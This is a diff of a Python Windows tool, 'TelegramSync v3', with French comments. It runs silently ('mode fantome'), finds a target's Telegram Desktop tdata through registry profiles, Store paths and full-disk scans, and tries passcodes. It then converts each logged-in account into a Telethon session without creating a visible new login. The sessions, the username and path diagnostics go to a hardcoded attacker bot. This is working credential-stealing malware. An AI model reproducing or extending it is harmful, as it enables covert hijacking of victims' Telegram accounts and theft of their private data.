@@ -1,20 +1,24 @@
 # -*- coding: utf-8 -*-
 """
-TelegramSync - tdata -> .session par compte -> envoi vers ton bot Telegram.
+TelegramSync v3 - tdata -> .session par compte -> envoi vers ton bot.
 
 Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
-Ne modifie JAMAIS le tdata de la victime (lecture seule via snapshot).
+Ne modifie JAMAIS le tdata de la cible (lecture via copie temporaire).
 
-Surcharges :
-  TG_TDATA      chemin force vers le dossier tdata
-  TG_PASSCODE   code d'acces local (si passcodes.txt ne suffit pas)
-  passcodes.txt a cote de l'exe : un code par ligne, essayes dans l'ordre
+v3 : detection large (registre des profils, version Microsoft Store,
+     scan disque sans limite de profondeur) + rapport DIAG systematique.
+
+Surcharges : TG_TDATA, TG_PASSCODE, passcodes.txt a cote de l'exe
 """
 import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
-import subprocess, time
+import subprocess, time, string
 import requests
 
-# ---- pas de console en mode windowed : on se protege de sys.stdout=None ----
+try:
+    import winreg
+except ImportError:
+    winreg = None
+
 if sys.stdout is None or sys.stderr is None:
     class _Null:
         def write(self, *a): pass
@@ -30,8 +34,6 @@ CHAT_ID   = 8425878739
 API_ID   = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 
-# Codes d'acces locaux a essayer (le premier qui dechiffre gagne).
-# "" = pas de code. Complete ici, ou depose passcodes.txt a cote de l'exe.
 PASSCODES = [""]
 # ----------------------------------------------------------------------
 
@@ -64,7 +66,7 @@ def load_passcodes():
     return out
 
 
-# ------------------------------------------------------------- bot helpers
+# ------------------------------------------------------------- bot
 def tg_call(method, **kw):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     r = requests.post(url, timeout=600, **kw)
@@ -87,7 +89,6 @@ def tg_file(path, caption=""):
 
 
 def tg_big(path, caption="", limit=45 * 1024 * 1024):
-    """La Bot API plafonne les documents a 50 Mo -> decoupage en parts."""
     if os.path.getsize(path) <= limit:
         tg_file(path, caption)
         return
@@ -105,102 +106,207 @@ def tg_big(path, caption="", limit=45 * 1024 * 1024):
             i += 1
 
 
-# ------------------------------------------------------------- tdata
-def is_tdata_dir(p):
-    """Un vrai tdata : key_datas + au moins un dossier de compte (16 hex)."""
-    if not p or not os.path.isdir(p):
-        return False
-    if not os.path.isfile(os.path.join(p, "key_datas")):
-        return False
+# ------------------------------------------------------------- detection
+SKIP_DIRS = {"windows", "program files", "program files (x86)", "$recycle.bin",
+             "system volume information", "recovery", "perflogs", "msocache",
+             "config.msi", "onedrivetemp", "intel", "amd", "nvidia",
+             "temp", "tmp", "cache", "cacheddata", "crashpad", "logs",
+             "node_modules", ".git", ".cache", "dumps", "emoji", "user_data"}
+
+_PROFILES = None
+
+
+def is_tdata(p):
     try:
-        return any(len(d) == 16 and os.path.isdir(os.path.join(p, d))
-                   for d in os.listdir(p))
+        return os.path.isfile(os.path.join(p, "key_datas"))
     except OSError:
         return False
 
 
-_SCAN_SKIP = {"temp", "Temp", "tmp", "Cache", "cache", "CachedData",
-              "Crashpad", "logs", "node_modules", ".git", ".cache",
-              "Packages", "dumps", "emoji", "user_data"}
-
-
-def _scan_roots():
-    return [
-        os.path.expandvars(r"%APPDATA%"),
-        os.path.expandvars(r"%LOCALAPPDATA%"),
-        os.path.expandvars(r"%USERPROFILE%"),
-        os.path.expandvars(r"%ProgramFiles%"),
-        os.path.expandvars(r"%ProgramFiles(x86)%"),
-    ]
-
-
-def _bounded_scan(max_depth=4):
-    """Dernier recours : cherche un dossier tdata* valide, profondeur bornee."""
-    found = []
-    for root in _scan_roots():
-        if not root or not os.path.isdir(root):
-            continue
-        base = root.rstrip("\\/").count(os.sep)
+def profile_roots():
+    """Profils Windows reels, lus dans le registre (pas devines)."""
+    global _PROFILES
+    if _PROFILES is not None:
+        return _PROFILES
+    roots = []
+    if winreg is not None:
         try:
-            for dirpath, dirnames, _ in os.walk(root):
-                if dirpath.rstrip("\\/").count(os.sep) - base >= max_depth:
-                    dirnames[:] = []
-                dirnames[:] = [d for d in dirnames if d not in _SCAN_SKIP]
-                if os.path.basename(dirpath).startswith("tdata") and is_tdata_dir(dirpath):
-                    found.append(dirpath)
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
+            i = 0
+            while True:
+                try:
+                    sub = winreg.EnumKey(key, i)
+                except OSError:
+                    break
+                i += 1
+                try:
+                    with winreg.OpenKey(key, sub) as sk:
+                        p, _ = winreg.QueryValueEx(sk, "ProfileImagePath")
+                        p = os.path.expandvars(p)
+                        if os.path.isdir(p):
+                            roots.append(p)
+                except OSError:
+                    pass
         except OSError:
             pass
+    if not roots:
+        u = os.environ.get("USERPROFILE")
+        if u:
+            roots.append(u)
+    _PROFILES = roots
+    return roots
+
+
+def store_tdata_paths():
+    """Version Microsoft Store : tdata dans LocalCache du package."""
+    out = []
+    loc = os.environ.get("LOCALAPPDATA") or ""
+    pkgs = os.path.join(loc, "Packages")
+    if not os.path.isdir(pkgs):
+        return out
+    try:
+        for d in os.listdir(pkgs):
+            if "telegram" not in d.lower():
+                continue
+            for sub in (r"LocalCache\Roaming\Telegram Desktop",
+                        r"LocalCache\Roaming",
+                        r"LocalCache\Local\Telegram Desktop"):
+                out.append(os.path.join(pkgs, d, sub, "tdata"))
+                out.append(os.path.join(pkgs, d, sub, "Telegram Desktop", "tdata"))
+    except OSError:
+        pass
+    return out
+
+
+def candidates():
+    c = []
+    if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]):
+        c.append(sys.argv[1])
+    if os.environ.get("TG_TDATA"):
+        c.append(os.environ["TG_TDATA"])
+
+    names = ("Telegram Desktop", "TelegramDesktop", "Telegram")
+    tds = ("tdata", "tdata#2", "tdata#3")
+
+    for var in ("APPDATA", "LOCALAPPDATA"):
+        b = os.environ.get(var)
+        if b:
+            for n in names:
+                for t in tds:
+                    c.append(os.path.join(b, n, t))
+
+    for r in profile_roots():
+        for sub in (r"AppData\Roaming", r"AppData\Local"):
+            for n in names:
+                for t in tds:
+                    c.append(os.path.join(r, sub, n, t))
+
+    c += store_tdata_paths()
+
+    d = exe_dir()
+    for base in (d, os.path.dirname(d), os.getcwd()):
+        for t in tds:
+            c.append(os.path.join(base, t))
+        c.append(os.path.join(base, "Telegram Desktop", "tdata"))
+
+    for L in string.ascii_uppercase:
+        root = L + ":\\"
+        if not os.path.isdir(root):
+            continue
+        for n in ("Telegram Desktop", "Telegram"):
+            c.append(os.path.join(root, n, "tdata"))
+        c.append(os.path.join(root, "tdata"))
+
+    seen, out = set(), []
+    for x in c:
+        try:
+            k = os.path.normcase(os.path.abspath(x))
+        except Exception:
+            continue
+        if k not in seen:
+            seen.add(k)
+            out.append(x)
+    return out
+
+
+def scan(roots, budget):
+    """Cherche le FICHIER key_datas, sans limite de profondeur."""
+    t0 = time.time()
+    found = []
+    for r in roots:
+        if not os.path.isdir(r):
+            continue
+        for cur, dirs, files in os.walk(r, onerror=lambda e: None):
+            if time.time() - t0 > budget:
+                return found
+            if "key_datas" in files:
+                found.append(cur)
+                dirs[:] = []
+                continue
+            dirs[:] = [x for x in dirs if x.lower() not in SKIP_DIRS]
     return found
 
 
 def find_tdata():
-    cands = []
-    if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]):
-        cands.append(sys.argv[1])
-    if os.environ.get("TG_TDATA"):
-        cands.append(os.environ["TG_TDATA"])
+    report = []
+    for p in candidates():
+        if os.path.isdir(p):
+            if is_tdata(p):
+                report.append(("OK", p))
+                return p, report
+            report.append(("dir", p))
+        else:
+            report.append(("--", p))
 
-    d = exe_dir()
-    for base in (d, os.path.dirname(d), os.getcwd()):
-        for n in ("tdata", "tdata#2", "tdata#3"):
-            cands.append(os.path.join(base, n))
+    tg_text("Aucun chemin standard. Scan du disque (max 5 min)...")
+    roots = list(profile_roots())
+    roots += [L + ":\\" for L in string.ascii_uppercase if os.path.isdir(L + ":\\")]
+    hits = scan(roots, budget=300)
+    for h in hits:
+        report.append(("SCAN", h))
+    if hits:
+        return hits[0], report
 
-    for base in (os.path.expandvars(r"%APPDATA%"),
-                 os.path.expandvars(r"%LOCALAPPDATA%")):
-        for n in ("Telegram Desktop", r"Telegram Desktop\Portable", "Telegram"):
-            for t in ("tdata", "tdata#2", "tdata#3"):
-                cands.append(os.path.join(base, n, t))
+    for st, p in report:
+        if st == "dir":
+            return p, report
+    return None, report
 
-    seen, uniq = set(), []
-    for c in cands:
+
+def diag_text(td, report):
+    app = os.environ.get("APPDATA") or ""
+    loc = os.environ.get("LOCALAPPDATA") or ""
+    pkgs = os.path.join(loc, "Packages")
+    store = []
+    if os.path.isdir(pkgs):
         try:
-            c = os.path.abspath(c)
-        except Exception:
-            continue
-        if c not in seen:
-            seen.add(c)
-            uniq.append(c)
-
-    for c in uniq:
-        if is_tdata_dir(c):
-            return c
-
-    found = _bounded_scan()
-    if found:
-        return found[0]
-
-    for c in uniq:
-        if os.path.isdir(c):
-            return c
-    return None
+            store = [d for d in os.listdir(pkgs) if "telegram" in d.lower()]
+        except OSError:
+            pass
+    lines = [
+        f"user={os.environ.get('USERNAME')}",
+        f"appdata={app}",
+        f"localappdata={loc}",
+        f"exe={exe_dir()}",
+        f"cwd={os.getcwd()}",
+        f"profil_classique={'oui' if os.path.isdir(os.path.join(app, 'Telegram Desktop')) else 'non'}",
+        f"packages_store={store}",
+        f"profils={profile_roots()}",
+        f"trouve={td}",
+        "---",
+    ]
+    lines += [f"{st} {p}" for st, p in report[:60]]
+    return "\n".join(lines)
 
 
+# ------------------------------------------------------------- tdata
 _SKIP_IN_TDATA = {"user_data", "user_data#2", "user_data#3", "user_data#4",
                   "emoji", "shortcuts", "temp", "webview", "dumps"}
 
 
 def snapshot_tdata(src, dst):
-    """Copie minimale et coherente : lisible meme si Telegram ecrit en meme temps."""
     shutil.rmtree(dst, ignore_errors=True)
     os.makedirs(dst, exist_ok=True)
     for name in os.listdir(src):
@@ -215,24 +321,7 @@ def snapshot_tdata(src, dst):
     return dst
 
 
-def diagnose(p):
-    if not p:
-        return "aucun dossier tdata trouve"
-    if not os.path.isdir(p):
-        return f"{p} n'existe pas"
-    try:
-        entries = os.listdir(p)
-    except OSError as e:
-        return f"{p} illisible : {e!r}"
-    acc = [d for d in entries if len(d) == 16 and os.path.isdir(os.path.join(p, d))]
-    return (f"{p}\n"
-            f"  key_datas : {'present' if os.path.isfile(os.path.join(p, 'key_datas')) else 'ABSENT'}\n"
-            f"  dossiers compte (16 hex) : {len(acc)}\n"
-            f"  fichiers : {len([e for e in entries if os.path.isfile(os.path.join(p, e))])}")
-
-
 def telegram_running():
-    """Purement informatif : on n'a plus besoin que la cible ferme Telegram."""
     try:
         out = subprocess.check_output(
             ["tasklist", "/FI", "IMAGENAME eq Telegram.exe"],
@@ -252,7 +341,6 @@ def zip_dir(src, dst):
 
 # ------------------------------------------------------------- conversion
 def load_tdesktop(tdata, passcodes):
-    """Essaie chaque passcode jusqu'a obtenir un TDesktop exploitable."""
     from opentele.td import TDesktop
     last = None
     for pc in passcodes:
@@ -264,9 +352,9 @@ def load_tdesktop(tdata, passcodes):
         except Exception as e:
             last = e
     raise RuntimeError(
-        f"tdata illisible : {last!r}\n\n{diagnose(tdata)}\n\n"
-        "Si un code d'acces local est actif, ajoute-le dans passcodes.txt "
-        "a cote de l'exe (ou TG_PASSCODE).")
+        f"tdata illisible : {last!r}\n"
+        "Si un code d'acces local est actif, mets-le dans passcodes.txt "
+        "a cote de l'exe.")
 
 
 async def convert_all(td, outdir):
@@ -280,8 +368,8 @@ async def convert_all(td, outdir):
         try:
             client = await acc.ToTelethon(
                 session=os.path.join(outdir, f"account_{i}"),
-                flag=UseCurrentSession,          # reutilise l'auth existante
-                api=API.TelegramDesktop,         # aucune nouvelle session visible
+                flag=UseCurrentSession,
+                api=API.TelegramDesktop,
             )
             await client.connect()
             if not await client.is_user_authorized():
@@ -309,28 +397,34 @@ async def convert_all(td, outdir):
     return out
 
 
-# ------------------------------------------------------------- main
 def run_once(tdata, passcodes, snap):
-    from opentele.td import TDesktop  # noqa: F401  (verifie l'import)
     snapshot_tdata(tdata, snap)
     td, used = load_tdesktop(snap, passcodes)
-    accounts = asyncio.run(convert_all(td, WORK))
-    return accounts, used
+    return asyncio.run(convert_all(td, WORK)), used
 
 
+# ------------------------------------------------------------- main
 def main():
-    tdata = find_tdata()
-    if not tdata or not is_tdata_dir(tdata):
-        tg_text("TelegramSync - echec\n" + diagnose(tdata))
+    tdata, report = find_tdata()
+    tg_text("DIAG\n" + diag_text(tdata, report))
+
+    if not tdata:
+        tg_text("RESULTAT: aucun tdata.\n"
+                "Telegram Desktop absent, jamais lance, ou sous un autre "
+                "compte Windows.")
+        return
+
+    if not is_tdata(tdata):
+        tg_text(f"RESULTAT: {tdata} existe mais sans key_datas.\n"
+                "Telegram Desktop n'a jamais ete lance/connecte.")
         return
 
     shutil.rmtree(WORK, ignore_errors=True)
     os.makedirs(WORK, exist_ok=True)
     snap = os.path.join(WORK, "tdata_snap")
 
-    accounts, used = None, None
-    last = None
-    for attempt in range(3):                 # la cible ne ferme pas Telegram
+    accounts, used, last = None, None, None
+    for _ in range(3):
         try:
             accounts, used = run_once(tdata, load_passcodes(), snap)
             if accounts:
@@ -339,8 +433,7 @@ def main():
             last = e
             time.sleep(2)
     if not accounts:
-        raise RuntimeError(f"conversion impossible apres 3 essais : {last!r}\n\n"
-                           + diagnose(tdata))
+        raise RuntimeError(f"conversion impossible apres 3 essais : {last!r}")
 
     manifest = os.path.join(WORK, "manifest.json")
     with open(manifest, "w", encoding="utf-8") as f:
